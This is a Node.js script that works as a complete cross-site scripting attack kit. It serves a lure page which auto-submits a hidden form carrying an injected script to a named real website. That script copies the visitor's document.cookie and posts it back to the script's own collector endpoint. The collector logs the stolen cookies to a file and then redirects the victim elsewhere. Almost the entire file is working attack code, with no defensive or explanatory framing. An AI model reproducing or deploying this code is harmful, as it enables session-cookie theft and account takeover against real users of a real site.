const http = require("http");
const queryString = require("querystring");
const url = require("url");
const fs = require("fs");

const open = (filename, mode) => {
  const fd = {};
  fd.internalFd = fs.openSync(filename, mode);
  fd.read = (buffer, position, len) => fs.readSync(fd.internalFd, buffer, position, len);
  fd.puts = (str) => fs.writeSync(fd.internalFd, str);
  fd.close = () => fs.closeSync(fd.internalFd);
  return fd;
}

http.createServer( (req, res) => {
  const expectedPath = url.parse("http://localhost:1337/cookiesReceiver.js",true).pathname;
  const receivedPath = url.parse(req.url, true).pathname;
  if (receivedPath == expectedPath) {
    let body = "";
    req.on("data", data => body += data);
    req.on("end", () => {
      const parsedRequestBody = queryString.parse(body);
      const fd = open("xss-results.txt", "a");
      fd.puts(parsedRequestBody["s"] + "\
");
      fd.close();
    });
    res.writeHead(301, { "location": "https://example.com" });
    res.end();
  } else if (receivedPath == "/news.php") {
    res.writeHead(200);
    res.end(`<!DOCTYPE html><html><head><meta charset="utf-8"></head><body><form name="payload" method="POST" id="xD" action="http://prensa.warnermedia.com">
<input type="hidden" name="s" id="inpPayload" value="dummy"></form>       
<script>
var sts = \`<\` + \`script>\`;
var ste = \`<\` + \`/\` +  \`script>\`;
var form=\`"><form name="payload2" method="POST" id="formu2" action="http://localhost:1337/cookiesReceiver.js"><input type="hidden" name="s" id="inputPayload" value="dummy"></form>$\{sts} try{document.getElementById("inputPayload").value = document.cookie;}catch(ERROR){}setTimeout(payload2.submit(), 0);$\{ste}\`;

try {
document.getElementById("inpPayload").value = form;
} catch(error) {
  alert(error);
}


setTimeout(payload.submit(), 0);      
</script>
</body></html>`);
  } else {
    res.writeHead(200);
    res.end("<html><body>Welcome to my website. Hope you have a great stance!</body></html>");
  }

}).listen(process.argv[2]);

